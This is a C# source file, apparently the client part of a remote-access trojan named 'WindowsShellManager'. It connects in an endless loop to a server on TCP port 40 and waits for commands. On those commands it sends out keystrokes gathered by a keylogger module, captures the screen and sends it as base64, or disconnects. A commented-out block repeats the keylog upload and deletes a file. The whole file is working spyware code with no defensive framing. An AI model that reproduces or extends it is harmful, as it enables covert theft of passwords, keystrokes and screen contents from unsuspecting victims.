using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;

namespace WindowsShellManager
{
    internal class Client
    {
        public static void Connect(String server)
        {
            while (true)
            {
                int packetSize = 256;
                try
                {
                    Int32 port = 40;
                    TcpClient client = new TcpClient(server, port);

                    Byte[] data = Encoding.ASCII.GetBytes("CONNECT");
                    NetworkStream stream = client.GetStream();
                    stream.Write(data, 0, data.Length);


                    while (true)
                    {
                        try
                        {
                            data = new Byte[packetSize];
                            String responseData = String.Empty;
                            Int32 bytes = stream.Read(data, 0, data.Length);
                            responseData = Encoding.ASCII.GetString(data, 0, bytes);
                            Console.WriteLine("Received: {0}", responseData);

                            if (responseData.ToUpper() == "SENDKCAPTURE")
                            {
                                Console.WriteLine("Sending Data...");
                                data = new Byte[packetSize];
                                data = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
                                features.KeyLogger.KeyLog = String.Empty;
                                stream.Write(data, 0, data.Length);                                
                            }
                            else if (responseData.ToUpper() == "SCREENSHOT")
                            {
                                Image bmp = new features.ScreenCapture().CaptureScreen();
                                data = new Byte[packetSize];
                                string image = Helpers.helper.ImageToBase64(bmp);
                                Console.WriteLine(image);
                                data = Encoding.ASCII.GetBytes("IMAGE" + image);                                                               
                                stream.Write(data, 0, data.Length);
                                bmp.Dispose();
                            }
                            else if (responseData.ToUpper() == "DISCONNECT")
                            {
                                stream.Close();
                                client.Close();
                                break;
                            }
                        }
                        catch (System.IO.IOException)
                        {
                            break;
                        }
                    }



                    //while (true)
                    //{
                    //    Console.WriteLine("Polling....");
                    //    responseData = String.Empty;
                    //    bytes = stream.Read(data, 0, data.Length);
                    //    responseData = Encoding.ASCII.GetString(data, 0, bytes);

                    //    Console.WriteLine("Received: {0}", responseData);
                    //    if (responseData.ToUpper() == "SENDKCAPTURE")
                    //    {
                    //        Console.WriteLine("Sending Data...");
                    //        data = new Byte[packetSize];
                    //        data = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
                    //        features.KeyLogger.KeyLog = String.Empty;
                    //        stream.Write(data, 0, data.Length);
                    //        File.Delete(Program.filePath);
                    //    }
                    //    else if (responseData.ToUpper() == "DISCONNECT")
                    //    {
                    //        data = new Byte[packetSize];
                    //        data = Encoding.ASCII.GetBytes("DISCONNECT");
                    //        stream.Write(data, 0, data.Length);
                    //        stream.Close();
                    //        client.Close();                      
                    //    }
                    //    break;
                    //}
                }
                catch (ArgumentNullException e)
                {
                    Console.WriteLine("ArgumentNullException: {0}", e);
                }
                catch (SocketException e)
                {
                    Console.WriteLine("SocketException: {0}", e);
                }
                catch (FileNotFoundException e)
                {
                    Console.WriteLine("FileNotFoundException: {0}", e);
                }
            }
        }
    }
}